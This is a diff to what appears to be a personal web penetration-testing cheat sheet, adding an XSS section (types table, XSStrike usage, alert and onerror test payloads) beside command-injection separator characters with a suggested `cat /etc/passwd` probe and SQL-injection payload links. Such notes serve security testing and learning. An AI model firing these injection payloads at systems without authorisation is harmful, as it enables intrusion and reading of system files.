@@ -70,7 +70,7 @@ You need to enumerate:
   - View source code to know the version of OS, server SQL, server web.
   - 
 Analyse every error message, its a good practise for what can you do and what can't you do 
-  ### Command injection
+### Command injection
 Try this basic caracters and add command like `dir` or `cat /etc/passwd`.
 ```text
 %09
@@ -96,7 +96,40 @@ $(...)
 %60%60%60
 ```
 You can find payloads of Windows and linux with file uploads of this repositorie
-  ### XSS (Cross Site Scripting)
+### XSS (Cross Site Scripting)
+Xss can be every where, in application, in html, wrappers, in file, postmessage, etc...   
+All payload or informations is here [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
+
+Main types of XSS :
+
+| Types              | Describes                                                                                               |
+|-------------------------------------|---------------------------------------------------------------------------------------------------------------|
+| Stored (Persistent) XSS       | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                              | 
+| Reflected (Non-Persistent) XSS                | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                               |
+| DOM-based XSS                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)  |
+
+**XSS Discovery**  
+you can use automated tools like XSS Strike, Brute XSS, XSSer.
+```bash
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+```
+or manual discover
+```html
+<script>alert(document.domain.concat("\n").concat(window.origin))</script>
+<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
+<script>debugger;</script>
+```
+
+**Dom based XSS**
+```
+<img src="" onerror=alert(window.origin)>
+#"><img src=/ onerror=alert(2)>
+```
+
+
 ### SQL Injection    
 Its time to SQLI Suuuuuuuuuuuuuuuuuu !!!!!!!!!!!  
 Before starting here some links and images useful : [Advance Payload SQLI Github](https://github.com/payloadbox/sql-injection-payload-list)  
